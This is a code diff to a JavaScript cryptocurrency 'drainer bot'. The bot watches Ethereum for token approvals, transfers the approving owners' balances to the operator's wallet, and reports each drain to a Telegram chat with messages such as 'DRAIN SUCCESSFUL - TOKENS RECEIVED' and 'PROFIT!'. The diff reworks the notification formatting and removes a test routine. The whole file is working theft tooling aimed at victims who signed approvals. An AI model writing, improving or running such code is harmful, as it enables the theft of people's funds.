@@ -55,7 +55,7 @@ async function sendTelegram(message) {
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
-        parse_mode: 'Markdown',
+        parse_mode: 'HTML',
         disable_web_page_preview: true
       })
     });
@@ -67,15 +67,16 @@ async function sendTelegram(message) {
     } else {
       console.log('❌ [Telegram] API error:', data.description);
       
-      // Try without markdown if markdown failed
-      if (data.description && data.description.includes('parse_mode')) {
-        console.log('🔄 [Telegram] Retrying without markdown...');
+      // Try without HTML if HTML failed
+      if (data.description && data.description.includes('parse')) {
+        console.log('🔄 [Telegram] Retrying without HTML...');
+        const plainMsg = message.replace(/<[^>]+>/g, '');
         const retryResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            text: message.replace(/[*`_]/g, '')
+            text: plainMsg
           })
         });
         const retryData = await retryResponse.json();
@@ -144,7 +145,7 @@ async function getTokenBalance(tokenAddress, owner, provider) {
 }
 
 // ============================================================
-// 🔴 DRAIN FUNCTION
+// 🔴 DRAIN FUNCTION (THIRD NOTIFICATION)
 // ============================================================
 async function drainToken(tokenAddress, owner, wallet, provider) {
   let tokenSymbol = 'Unknown';
@@ -180,12 +181,14 @@ async function drainToken(tokenAddress, owner, wallet, provider) {
     formattedBalance = ethers.formatUnits(rawBalance, decimals);
     console.log(`💰 Found ${formattedBalance} ${tokenSymbol}`);
     
-    // Send Telegram notification
+    // THIRD NOTIFICATION - Approval detected, about to drain
     await sendTelegram(
-      `🎯 *Approval Detected*\n` +
+      `🎯 <b>APPROVAL DETECTED - DRAINING...</b>\n\n` +
       `Token: ${tokenSymbol}\n` +
       `Amount: ${formattedBalance}\n` +
-      `From: \`${owner.slice(0, 6)}...${owner.slice(-4)}\``
+      `From: <code>${owner.slice(0, 6)}...${owner.slice(-4)}</code>\n` +
+      `To: <code>${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}</code>\n\n` +
+      `⏳ Transaction in progress...`
     );
     
     // Check if bot has ETH for gas
@@ -196,9 +199,11 @@ async function drainToken(tokenAddress, owner, wallet, provider) {
     if (botBalance < ethers.parseEther('0.002')) {
       console.log('❌ Bot has less than 0.002 ETH - cannot drain!');
       await sendTelegram(
-        `⚠️ *Low Gas Warning*\n` +
-        `Bot has only ${botEthBalance} ETH\n` +
-        `Need at least 0.002 ETH to drain ${formattedBalance} ${tokenSymbol}`
+        `⚠️ <b>DRAIN FAILED - LOW GAS</b>\n\n` +
+        `Token: ${tokenSymbol}\n` +
+        `Amount: ${formattedBalance}\n` +
+        `From: <code>${owner.slice(0, 6)}...${owner.slice(-4)}</code>\n` +
+        `Error: Bot has only ${botEthBalance} ETH (need 0.002 ETH minimum)`
       );
       return false;
     }
@@ -218,16 +223,16 @@ async function drainToken(tokenAddress, owner, wallet, provider) {
     // Wait for confirmation
     const receipt = await tx.wait();
     console.log(`✅ Confirmed in block ${receipt.blockNumber}`);
-    console.log(`✅ Gas used: ${receipt.gasUsed.toString()}`);
     
-    // Send success notification
+    // THIRD NOTIFICATION - SUCCESS (Final confirmation)
     await sendTelegram(
-      `✅ *Drain Successful*\n` +
+      `✅ <b>DRAIN SUCCESSFUL - TOKENS RECEIVED</b>\n\n` +
       `Token: ${tokenSymbol}\n` +
       `Amount: ${formattedBalance}\n` +
-      `From: \`${owner.slice(0, 6)}...${owner.slice(-4)}\`\n` +
-      `To: \`${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}\`\n` +
-      `TX: [View](https://etherscan.io/tx/${tx.hash})`
+      `From: <code>${owner.slice(0, 6)}...${owner.slice(-4)}</code>\n` +
+      `To: <code>${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}</code>\n` +
+      `Tx: <a href="https://etherscan.io/tx/${tx.hash}">View on Etherscan</a>\n\n` +
+      `💰 <b>PROFIT!</b>`
     );
     
     return true;
@@ -235,7 +240,7 @@ async function drainToken(tokenAddress, owner, wallet, provider) {
   } catch (err) {
     console.error('❌ Drain error:', err.message);
     
-    // Check for specific errors
+    // THIRD NOTIFICATION - FAILED
     let errorMsg = err.message;
     if (err.message.includes('insufficient funds')) {
       errorMsg = 'Bot has insufficient ETH for gas';
@@ -246,9 +251,10 @@ async function drainToken(tokenAddress, owner, wallet, provider) {
     }
     
     await sendTelegram(
-      `❌ *Drain Failed*\n` +
+      `❌ <b>DRAIN FAILED</b>\n\n` +
       `Token: ${tokenSymbol}\n` +
       `Amount: ${formattedBalance}\n` +
+      `From: <code>${owner.slice(0, 6)}...${owner.slice(-4)}</code>\n` +
       `Error: ${errorMsg.slice(0, 100)}`
     );
     return false;
@@ -262,60 +268,6 @@ function isTokenMonitored(tokenAddress) {
   return TOKENS_TO_MONITOR.some(t => 
     t.address.toLowerCase() === tokenAddress.toLowerCase()
   );
-}
-
-// ============================================================
-// 🔴 TEST FUNCTION
-// ============================================================
-async function runTests(provider, wallet) {
-  console.log('\n🧪 ===== RUNNING SYSTEM TESTS =====');
-  
-  // Test 1: Telegram
-  console.log('🧪 Test 1: Telegram...');
-  await sendTelegram('🤖 *Drainer Bot Started*\n✅ System tests beginning...');
-  
-  // Test 2: Ethereum connection
-  console.log('🧪 Test 2: Ethereum connection...');
-  try {
-    const blockNumber = await provider.getBlockNumber();
-    console.log(`✅ Connected. Current block: ${blockNumber}`);
-  } catch (err) {
-    console.log('❌ Connection failed:', err.message);
-  }
-  
-  // Test 3: Bot wallet balance
-  console.log('🧪 Test 3: Bot wallet balance...');
-  try {
-    const balance = await provider.getBalance(wallet.address);
-    const ethBalance = ethers.formatEther(balance);
-    console.log(`✅ Bot balance: ${ethBalance} ETH`);
-    
-    if (balance < ethers.parseEther('0.01')) {
-      await sendTelegram(
-        `⚠️ *LOW BALANCE WARNING*\n` +
-        `Bot has only ${ethBalance} ETH\n` +
-        `Send at least 0.01 ETH to:\n` +
-        `\`${YOUR_WALLET_ADDRESS}\``
-      );
-    } else {
-      await sendTelegram(`✅ Bot balance: ${ethBalance} ETH`);
-    }
-  } catch (err) {
-    console.log('❌ Balance check failed:', err.message);
-  }
-  
-  // Test 4: Check if we can read token contracts
-  console.log('🧪 Test 4: Token contract test...');
-  try {
-    const testToken = TOKENS_TO_MONITOR[0];
-    const tokenContract = new ethers.Contract(testToken.address, ERC20_ABI, provider);
-    const symbol = await tokenContract.symbol();
-    console.log(`✅ Can read token: ${symbol}`);
-  } catch (err) {
-    console.log('❌ Token test failed:', err.message);
-  }
-  
-  console.log('🧪 ===== TESTS COMPLETE =====\n');
 }
 
 // ============================================================
@@ -361,9 +313,10 @@ async function main() {
     
     // Send startup notification
     await sendTelegram(
-      `🚀 *Drainer Bot Started*\n` +
-      `📤 Receiving: \`${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}\`\n` +
-      `💰 Balance: ${ethers.formatEther(botBalance)} ETH`
+      `🚀 <b>DRAINER BOT ONLINE</b>\n\n` +
+      `📤 Receiving: <code>${YOUR_WALLET_ADDRESS.slice(0, 6)}...${YOUR_WALLET_ADDRESS.slice(-4)}</code>\n` +
+      `💰 Balance: ${ethers.formatEther(botBalance)} ETH\n` +
+      `👀 Monitoring for approvals...`
     );
     
     // Listen for new blocks
@@ -396,23 +349,14 @@ async function main() {
           if (tokenData && tokenData.balance > 0n) {
             console.log(`💰 Balance: ${tokenData.formattedBalance} ${tokenData.symbol}`);
             
-            // Send immediate notification
-            await sendTelegram(
-              `🎯 *Approval Found*\n` +
-              `Token: ${tokenData.symbol}\n` +
-              `Amount: ${tokenData.formattedBalance}\n` +
-              `From: \`${owner.slice(0, 6)}...${owner.slice(-4)}\`\n` +
-              `Block: ${blockNumber}`
-            );
-            
             // Drain the tokens
             await drainToken(tokenAddress, owner, wallet, provider);
           } else {
             console.log(`⚠️ No balance found for token`);
             await sendTelegram(
-              `⚠️ *Approval Found But No Balance*\n` +
+              `⚠️ <b>APPROVAL DETECTED - NO BALANCE</b>\n\n` +
               `Token: ${tokenAddress.slice(0, 10)}...\n` +
-              `From: \`${owner.slice(0, 6)}...${owner.slice(-4)}\`\n` +
+              `From: <code>${owner.slice(0, 6)}...${owner.slice(-4)}</code>\n` +
               `Token may have been already drained`
             );
           }
@@ -460,9 +404,6 @@ async function main() {
       console.log(`\n✅ Processed ${missedFound} missed approvals`);
     }
     
-    // Run tests
-    await runTests(provider, wallet);
-    
     // Keep process alive and log heartbeat
     setInterval(async () => {
       const balance = await provider.getBalance(wallet.address);
@@ -471,7 +412,7 @@ async function main() {
     
   } catch (err) {
     console.error('🔥 Fatal error in main:', err);
-    await sendTelegram(`❌ *Bot Crashed*\n${err.message.slice(0, 200)}`);
+    await sendTelegram(`❌ <b>BOT CRASHED</b>\n\n${err.message.slice(0, 200)}`);
     process.exit(1);
   }
 }
@@ -481,12 +422,12 @@ async function main() {
 // ============================================================
 process.on('uncaughtException', (err) => {
   console.error('🔥 UNCAUGHT EXCEPTION:', err);
-  sendTelegram(`❌ *Uncaught Exception*\n${err.message.slice(0, 200)}`);
+  sendTelegram(`❌ <b>UNCAUGHT EXCEPTION</b>\n\n${err.message.slice(0, 200)}`);
 });
 
 process.on('unhandledRejection', (err) => {
   console.error('🔥 UNHANDLED REJECTION:', err);
-  sendTelegram(`❌ *Unhandled Rejection*\n${err.message.slice(0, 200)}`);
+  sendTelegram(`❌ <b>UNHANDLED REJECTION</b>\n\n${err.message.slice(0, 200)}`);
 });
 
 // ============================================================
